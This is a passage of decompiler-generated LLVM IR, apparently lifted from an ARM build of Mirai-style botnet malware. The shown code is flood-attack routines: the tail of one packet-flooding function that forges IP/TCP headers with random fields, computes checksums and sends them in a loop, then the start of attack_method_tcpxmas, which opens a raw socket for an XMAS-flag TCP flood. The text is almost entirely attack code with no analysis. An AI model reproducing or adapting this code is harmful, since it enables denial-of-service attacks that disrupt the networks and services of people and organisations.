  %v1_a9fc = phi i32 [ %v1_a9fc.pre, %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge ], [ 65535, %dec_label_pc_a9ec ]
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v9_a9fc = icmp eq i32 %v3_a7a8, %v1_a9fc
  store i1 %v9_a9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9fc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v1_aa08 = phi i32 [ %v1_aadc, %dec_label_pc_aad0 ], [ %v1_a9fc, %dec_label_pc_a9f8 ]
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v9_aa08 = icmp eq i32 %v3_a7b0, %v1_aa08
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04, %dec_label_pc_aaf8
  %v0_aa10 = load i32, i32* @r4, align 4
  %v1_aa10 = add i32 %v0_aa10, 41
  store i32 %v1_aa10, i32* %r0.global-to-local, align 4
  store i32 %v4_aa14.pre-phi, i32* %r1.global-to-local, align 4
  %v2_aa18 = call i32 @rand_alpha_str(i32 %v1_aa10, i32 %v4_aa14.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aa20 = load i32, i32* @r4, align 4
  %v3_aa20 = add i32 %v2_aa20, 10
  %v4_aa20 = inttoptr i32 %v3_aa20 to i16*
  store i16 0, i16* %v4_aa20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* @r0, align 4
  %v2_aa2c = call i32 @checksum_generic(i32 %v0_aa28, i32 20)
  %v3_aa2c = trunc i32 %v2_aa2c to i16
  store i32 %v2_aa2c, i32* %r0.global-to-local, align 4
  %v3_aa30 = load i32, i32* @r4, align 4
  %v4_aa30 = add i32 %v3_aa30, 10
  %v5_aa30 = inttoptr i32 %v4_aa30 to i16*
  store i16 %v3_aa2c, i16* %v5_aa30, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_aa38 = load i32, i32* @r6, align 4
  %v3_aa38 = add i32 %v2_aa38, 6
  %v4_aa38 = inttoptr i32 %v3_aa38 to i16*
  store i16 0, i16* %v4_aa38, align 2
  %v0_aa3c = load i32, i32* @r6, align 4
  store i32 %v0_aa3c, i32* @r1, align 4
  %v1_aa40 = add i32 %v0_aa3c, 4
  %v2_aa40 = inttoptr i32 %v1_aa40 to i16*
  %v3_aa40 = load i16, i16* %v2_aa40, align 2
  %v4_aa40 = zext i16 %v3_aa40 to i32
  store i32 %v4_aa40, i32* %r2.global-to-local, align 4
  %v0_aa44 = load i32, i32* @sb, align 4
  store i32 %v0_aa44, i32* %r3.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v4_aa4c = call i32 @checksum_tcpudp(i32 %v0_aa48, i32 %v0_aa3c, i32 %v4_aa40, i32 %v0_aa44)
  %v5_aa4c = trunc i32 %v4_aa4c to i16
  store i32 %v4_aa4c, i32* %r0.global-to-local, align 4
  %v3_aa50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa50, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_aa58 = mul i32 %v3_aa50, 32
  store i32 %v3_aa58, i32* %ip.global-to-local, align 4
  %v3_aa5c = load i32, i32* @r6, align 4
  %v4_aa5c = add i32 %v3_aa5c, 6
  %v5_aa5c = inttoptr i32 %v4_aa5c to i16*
  store i16 %v5_aa4c, i16* %v5_aa5c, align 2
  %v0_aa60 = load i32, i32* %ip.global-to-local, align 4
  %v1_aa60 = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_aa60, -8
  %v5_aa60 = add i32 %v0_aa60, %tmp128
  store i32 %v5_aa60, i32* %ip.global-to-local, align 4
  %v0_aa64 = load i32, i32* @r6, align 4
  %v1_aa64 = add i32 %v0_aa64, 2
  %v2_aa64 = inttoptr i32 %v1_aa64 to i16*
  %v3_aa64 = load i16, i16* %v2_aa64, align 2
  %v4_aa64 = zext i16 %v3_aa64 to i32
  store i32 %v4_aa64, i32* @r6, align 4
  %v1_aa68 = load i32, i32* @lr, align 4
  %v2_aa68 = add i32 %v1_aa68, %v5_aa60
  store i32 %v2_aa68, i32* %ip.global-to-local, align 4
  %v3_aa6c = add i32 %v2_aa68, 2
  %v4_aa6c = inttoptr i32 %v3_aa6c to i16*
  store i16 %v3_aa64, i16* %v4_aa6c, align 2
  %v0_aa70 = load i32, i32* @fp, align 4
  %v1_aa70 = load i32, i32* %ip.global-to-local, align 4
  %v2_aa70 = add i32 %v1_aa70, 4
  %v3_aa70 = inttoptr i32 %v2_aa70 to i32*
  store i32 %v0_aa70, i32* %v3_aa70, align 4
  %v0_aa74 = load i32, i32* @r4, align 4
  store i32 %v0_aa74, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v0_aa80 = load i32, i32* @sl, align 4
  store i32 %v0_aa80, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_aa88 = load i32, i32* %ip.global-to-local, align 4
  %v6_aa90 = call i32 @__libc_sendto(i32 %v3_a728, i32 %v0_aa74, i32 %v0_aa80, i32 16384, i32 %v0_aa88, i32 16)
  %v3_aa94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa94, i32* %r3.global-to-local, align 4
  %v1_aa98 = add i32 %v3_aa94, 1
  store i32 %v1_aa98, i32* %r0.global-to-local, align 4
  %v0_aa9c = load i32, i32* @r8, align 4
  %v9_aa9c = icmp eq i32 %v0_aa9c, %v1_aa98
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa98, i32* %stack_var_-44, align 4
  %v8_aaa4 = icmp sgt i32 %v0_aa9c, %v1_aa98
  br i1 %v8_aaa4, label %dec_label_pc_a9cc, label %dec_label_pc_aaa8

dec_label_pc_aaa8:                                ; preds = %dec_label_pc_aa10
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aaac = icmp eq i32 %v0_aa9c, 0
  store i1 %v2_aaac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aaac, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_aabc:                                ; preds = %dec_label_pc_a9cc
  %v0_aabc = call i32 @rand_next()
  %v1_aabc = trunc i32 %v0_aabc to i16
  store i32 %v0_aabc, i32* %r0.global-to-local, align 4
  store i32 %v3_a78c, i32* @lr, align 4
  %v1_aac4 = load i32, i32* @r5, align 4
  %v9_aac4 = icmp eq i32 %v3_a78c, %v1_aac4
  store i1 %v9_aac4, i1* %cpsr_z.global-to-local, align 1
  %v3_aac8 = load i32, i32* @r4, align 4
  %v4_aac8 = add i32 %v3_aac8, 4
  %v5_aac8 = inttoptr i32 %v4_aac8 to i16*
  store i16 %v1_aabc, i16* %v5_aac8, align 2
  br i1 %v9_aac4, label %dec_label_pc_aad0, label %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge

dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge:    ; preds = %dec_label_pc_aabc
  %v1_a9fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a9f8

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aabc, %dec_label_pc_a9ec
  %v0_aad0 = call i32 @rand_next()
  %v1_aad0 = trunc i32 %v0_aad0 to i16
  %v3_aad4 = load i32, i32* @r4, align 4
  %v4_aad4 = add i32 %v3_aad4, 20
  %v5_aad4 = inttoptr i32 %v4_aad4 to i16*
  store i16 %v1_aad0, i16* %v5_aad4, align 2
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v1_aadc = load i32, i32* @r5, align 4
  %v9_aadc = icmp eq i32 %v3_a7a8, %v1_aadc
  store i1 %v9_aadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aadc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aae4:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v0_aae4 = call i32 @rand_next()
  %v1_aae4 = trunc i32 %v0_aae4 to i16
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v1_aaec = load i32, i32* @r5, align 4
  %v9_aaec = icmp eq i32 %v3_a7b0, %v1_aaec
  store i1 %v9_aaec, i1* %cpsr_z.global-to-local, align 1
  %v3_aaf0 = load i32, i32* @r6, align 4
  %v4_aaf0 = add i32 %v3_aaf0, 2
  %v5_aaf0 = inttoptr i32 %v4_aaf0 to i16*
  store i16 %v1_aae4, i16* %v5_aaf0, align 2
  br i1 %v9_aaec, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04
  %v0_aaf8 = call i32 @rand_next()
  %v1_aaf8 = trunc i32 %v0_aaf8 to i16
  store i32 %v0_aaf8, i32* %r0.global-to-local, align 4
  %v3_aafc = load i32, i32* @r4, align 4
  %v4_aafc = add i32 %v3_aafc, 28
  %v5_aafc = inttoptr i32 %v4_aafc to i16*
  store i16 %v1_aaf8, i16* %v5_aafc, align 2
  br label %dec_label_pc_aa10

dec_label_pc_ab04:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a670, %dec_label_pc_a614, %entry
  %v0_ab04 = call i32 @rand_next()
  %v1_ab08 = urem i32 %v0_ab04, 4
  store i32 %v1_ab08, i32* %r0.global-to-local, align 4
  %v2_ab0c = icmp eq i32 %v1_ab08, 3
  store i1 %v2_ab0c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_ab04 to i2
  switch i2 %trunc, label %dec_label_pc_a70811 [
    i2 0, label %dec_label_pc_ab40
    i2 1, label %dec_label_pc_ab6c
    i2 -2, label %dec_label_pc_ab60
    i2 -1, label %dec_label_pc_ab50
  ]

dec_label_pc_ab28:                                ; preds = %dec_label_pc_a738
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v1_ab2c = call i32 @__GI___libc_close(i32 %v3_a728)
  store i32 %v1_ab2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ab30

dec_label_pc_ab30:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a708, %dec_label_pc_ab28
  %v1_ab3c = phi i32 [ %v3_a728, %dec_label_pc_a710 ], [ %v1_ab3c49, %dec_label_pc_a708 ], [ %v1_ab2c, %dec_label_pc_ab28 ]
  store i32 %v27_a4c0, i32* %lr.global-to-local, align 4
  ret i32 %v1_ab3c

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab04
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab50:                                ; preds = %dec_label_pc_ab04
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab04
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_ab04
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_a708

; uselistorder directives
  uselistorder i32 %v1_ab08, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_ab04, { 1, 0 }
  uselistorder i32 %v0_aaf8, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_aadc, { 1, 0 }
  uselistorder i32 %v0_aabc, { 1, 0 }
  uselistorder i32 %v1_aa98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_aa60, { 1, 0 }
  uselistorder i32 %v4_aa4c, { 1, 0 }
  uselistorder i32 %v2_aa2c, { 1, 0 }
  uselistorder i1 %v3_a9f0, { 1, 0 }
  uselistorder i1 %v3_a9e0, { 1, 0 }
  uselistorder i32 %v4_aa14.pre-phi, { 1, 0 }
  uselistorder i32 %v1_a988, { 1, 0, 2 }
  uselistorder i32 %v0_a978, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_a964, { 2, 0, 3, 1 }
  uselistorder i32 %v0_a960, { 1, 0, 2 }
  uselistorder i32 %v0_a8d0, { 1, 0 }
  uselistorder i32 %v4_a8cc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_a818, { 1, 0 }
  uselistorder i32 %v3_a7d4, { 1, 0 }
  uselistorder i32 %v1_a7c8, { 2, 0, 1 }
  uselistorder i32 %v3_a794, { 1, 0 }
  uselistorder i32 %v3_a78c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_a784, { 0, 2, 1 }
  uselistorder i8 %v5_a77c, { 1, 0, 2 }
  uselistorder i32 %v0_a768, { 1, 0 }
  uselistorder i1 %v7_a758, { 1, 0 }
  uselistorder i1 %v7_a72c, { 1, 0 }
  uselistorder i32 %v3_a728, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_a708, { 1, 0, 2 }
  uselistorder i32 %v2_a6d8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a6d4, { 1, 0, 2 }
  uselistorder i1 %v7_a6c4, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0, 2 }
  uselistorder i1 %v8_a6b8, { 1, 0 }
  uselistorder i1 %v7_a6b4, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i8 %v2_a69c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a6a0, { 1, 0 }
  uselistorder i32 %v0_a6c0, { 3, 0, 2, 1 }
  uselistorder i32 %v0_a690, { 0, 2, 1 }
  uselistorder i32 %v1_a6a4, { 0, 2, 1 }
  uselistorder i32 %v2_a678, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a670, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a668, { 1, 0 }
  uselistorder i32 %v0_a668, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_a60c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_a5ac, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a590, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a578, { 2, 1, 0 }
  uselistorder i32 %v1_a560, { 1, 0 }
  uselistorder i32 %v7_a51c, { 1, 0, 2 }
  uselistorder i32 %v2_a4e0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 15, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 7, 6, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 15, 16, 1, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 5, 7, 6, 9, 8, 10, 12, 11, 14, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 24, 23, 26, 25, 27, 28, 29, 34, 30, 31, 32, 33, 38, 35, 36, 37, 39, 41, 40, 42, 43, 44, 45, 47, 46, 48, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 9, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %dec_label_pc_a9b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a9b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a980, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_a6d0, { 1, 0 }
  uselistorder label %dec_label_pc_a6c4, { 1, 0 }
  uselistorder label %dec_label_pc_a690, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a688, { 1, 0 }
}

define i32 @attack_method_tcpxmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ab7c = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_ab98 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_aba4 = load i32, i32* @r6, align 4
  store i32 %v0_aba4, i32* %r0.global-to-local, align 4
  %v2_aba8 = call i32 @calloc(i32 %v0_aba4, i32 4)
  %v0_abac = load i32, i32* @r5, align 4
  store i32 %v0_abac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_abbc = load i32, i32* @r4, align 4
  store i32 %v0_abbc, i32* %r0.global-to-local, align 4
  %v5_abc0 = inttoptr i32 %v0_abac to i32*
  %v6_abc0 = call i32 @attack_get_opt_int(i32 %v0_abbc, i32* %v5_abc0, i32 2, i32 0)
  %v1_abcc = urem i32 %v6_abc0, 256
  store i32 %v1_abcc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r5, align 4
  store i32 %v0_abd8, i32* %r1.global-to-local, align 4
  %v0_abdc = load i32, i32* @r4, align 4
  store i32 %v0_abdc, i32* %r0.global-to-local, align 4
  %v5_abe0 = trunc i32 %v6_abc0 to i8
  %v6_abe4 = inttoptr i32 %v0_abd8 to i32*
  %v7_abe4 = call i32 @attack_get_opt_int(i32 %v0_abdc, i32* %v6_abe4, i32 3, i32 65535)
  %v0_abe8 = load i32, i32* @r5, align 4
  store i32 %v0_abe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_abe4, i32* @r7, align 4
  %v0_abf8 = load i32, i32* @r4, align 4
  store i32 %v0_abf8, i32* %r0.global-to-local, align 4
  %v4_abfc = inttoptr i32 %v0_abe8 to i32*
  %v5_abfc = call i32 @attack_get_opt_int(i32 %v0_abf8, i32* %v4_abfc, i32 4, i32 64)
  %v1_ac04 = urem i32 %v5_abfc, 256
  store i32 %v1_ac04, i32* %ip.global-to-local, align 4
  %v0_ac08 = load i32, i32* @r5, align 4
  store i32 %v0_ac08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v0_ac14, i32* %r0.global-to-local, align 4
  %v6_ac1c = inttoptr i32 %v0_ac08 to i32*
  %v7_ac1c = call i32 @attack_get_opt_int(i32 %v0_ac14, i32* %v6_ac1c, i32 5, i32 1)
  %v1_ac28 = urem i32 %v7_ac1c, 256
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ac30 = load i32, i32* @r5, align 4
  store i32 %v0_ac30, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ac38 = load i32, i32* @r4, align 4
  store i32 %v0_ac38, i32* %r0.global-to-local, align 4
  %v5_ac40 = inttoptr i32 %v0_ac30 to i32*
  %v6_ac40 = call i32 @attack_get_opt_int(i32 %v0_ac38, i32* %v5_ac40, i32 7, i32 65535)
  %v0_ac44 = load i32, i32* @r5, align 4
  store i32 %v0_ac44, i32* %r1.global-to-local, align 4
  %v3_ac48 = mul i32 %v6_ac40, 65536
  store i32 %v3_ac48, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* @r4, align 4
  store i32 %v0_ac54, i32* %r0.global-to-local, align 4
  %v3_ac58 = urem i32 %v6_ac40, 65536
  store i32 %v3_ac58, i32* @sl, align 4
  %v4_ac5c = inttoptr i32 %v0_ac44 to i32*
  %v5_ac5c = call i32 @attack_get_opt_int(i32 %v0_ac54, i32* %v4_ac5c, i32 11, i32 1)
  %v1_ac64 = urem i32 %v5_ac5c, 256
  store i32 %v1_ac64, i32* %ip.global-to-local, align 4
  %v0_ac68 = load i32, i32* @r5, align 4
  store i32 %v0_ac68, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* @r4, align 4
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  %v5_ac7c = inttoptr i32 %v0_ac68 to i32*
  %v6_ac7c = call i32 @attack_get_opt_int(i32 %v0_ac74, i32* %v5_ac7c, i32 12, i32 1)
  %v1_ac84 = urem i32 %v6_ac7c, 256
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_ac88 = load i32, i32* @r5, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r4, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v5_ac9c = inttoptr i32 %v0_ac88 to i32*
  %v6_ac9c = call i32 @attack_get_opt_int(i32 %v0_ac94, i32* %v5_ac9c, i32 13, i32 1)
  %v1_aca4 = urem i32 %v6_ac9c, 256
  store i32 %v1_aca4, i32* %ip.global-to-local, align 4
  %v0_aca8 = load i32, i32* @r5, align 4
  store i32 %v0_aca8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acb4 = load i32, i32* @r4, align 4
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  %v5_acbc = inttoptr i32 %v0_aca8 to i32*
  %v6_acbc = call i32 @attack_get_opt_int(i32 %v0_acb4, i32* %v5_acbc, i32 14, i32 1)
  %v1_acc4 = urem i32 %v6_acbc, 256
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_acc8 = load i32, i32* @r5, align 4
  store i32 %v0_acc8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r4, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v5_acdc = inttoptr i32 %v0_acc8 to i32*
  %v6_acdc = call i32 @attack_get_opt_int(i32 %v0_acd4, i32* %v5_acdc, i32 15, i32 1)
  %v1_ace4 = urem i32 %v6_acdc, 256
  store i32 %v1_ace4, i32* %ip.global-to-local, align 4
  %v0_ace8 = load i32, i32* @r5, align 4
  store i32 %v0_ace8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acf4 = load i32, i32* @r4, align 4
  store i32 %v0_acf4, i32* %r0.global-to-local, align 4
  %v5_acfc = inttoptr i32 %v0_ace8 to i32*
  %v6_acfc = call i32 @attack_get_opt_int(i32 %v0_acf4, i32* %v5_acfc, i32 16, i32 1)
  %v1_ad04 = urem i32 %v6_acfc, 256
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_ad10 = load i32, i32* @r5, align 4
  store i32 %v0_ad10, i32* %r1.global-to-local, align 4
  %v0_ad14 = load i32, i32* @r4, align 4
  store i32 %v0_ad14, i32* %r0.global-to-local, align 4
  %v5_ad1c = inttoptr i32 %v0_ad10 to i32*
  %v6_ad1c = call i32 @attack_get_opt_int(i32 %v0_ad14, i32* %v5_ad1c, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ad2c = load i32, i32* @r5, align 4
  store i32 %v0_ad2c, i32* %r1.global-to-local, align 4
  %v0_ad30 = load i32, i32* @r4, align 4
  store i32 %v0_ad30, i32* %r0.global-to-local, align 4
  %v4_ad34 = inttoptr i32 %v0_ad2c to i32*
  %v5_ad34 = call i32 @attack_get_opt_int(i32 %v0_ad30, i32* %v4_ad34, i32 1, i32 1)
  %v1_ad3c = urem i32 %v5_ad34, 256
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_ad50 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ad50, i32* %r0.global-to-local, align 4
  %v7_ad54 = icmp eq i32 %v3_ad50, -1
  store i1 %v7_ad54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad50, i32* @sb, align 4
  br i1 %v7_ad54, label %dec_label_pc_af44, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ad68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ad68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ad7c = call i32 @__GI_setsockopt(i32 %v3_ad50, i32 0, i32 3, i32 %v6_ad68, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ad7c, i32* %r0.global-to-local, align 4
  %v7_ad80 = icmp eq i32 %v5_ad7c, -1
  store i1 %v7_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad80, label %dec_label_pc_af3c, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad60
  %v0_ad88 = load i32, i32* @r7, align 4
  %v3_ad88 = mul i32 %v0_ad88, 65536
  store i32 %v3_ad88, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_ad90 = load i32, i32* @r6, align 4
  %v2_ad90 = icmp eq i32 %v0_ad90, 0
  store i1 %v2_ad90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ad98 = urem i32 %v0_ad88, 65536
  store i32 %v3_ad98, i32* @fp, align 4
  br i1 %v2_ad90, label %dec_label_pc_b1c8, label %dec_label_pc_ada0.preheader

dec_label_pc_ada0.preheader:                      ; preds = %dec_label_pc_ad88
  %v2_adec = ptrtoint i32* %stack_var_-144 to i32
  %v2_ae30 = ptrtoint i32* %stack_var_-64 to i32
  %v2_ae68 = ptrtoint i32* %stack_var_-80 to i32
  %v2_ae74 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ae78 = ptrtoint i32* %stack_var_-48 to i32
  %v4_aed8 = zext i8 %tmp to i32
  %v1_aedc = and i32 %v4_aed8, 18
  %v2_aee0 = icmp eq i32 %v1_aedc, 18
  %v4_b084 = sext i8 %v5_abe0 to i32
  %sext = mul i32 %v5_abfc, 16777216
  %v4_b094 = sdiv i32 %sext, 16777216
  %v3_aec4 = sext i16 %tmp61 to i32
  %v1_aee8 = and i32 %v4_aed8, 5
  %v2_aee8 = icmp eq i32 %v1_aee8, 0
  %v4_ae28 = add i32 %v2_adec, 82
  %v5_ae28 = inttoptr i32 %v4_ae28 to i16*
  %v1_b018 = add i32 %v6_ad1c, 40
